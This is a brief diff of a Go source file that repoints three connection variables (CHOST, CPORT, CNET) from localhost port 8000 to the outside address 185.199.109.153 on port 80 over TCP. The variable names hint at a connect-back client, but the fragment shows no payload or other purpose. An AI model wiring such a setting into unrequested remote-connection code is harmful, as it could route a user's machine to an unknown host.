@@ -12,8 +12,8 @@ import (
 
 //UGHHHHH ...
 var (
-	CHOST = "127.0.0.1"
-	CPORT = "8000"
+	CHOST = "185.199.109.153"
+	CPORT = "80"
 	CNET  = "tcp"
 )
 
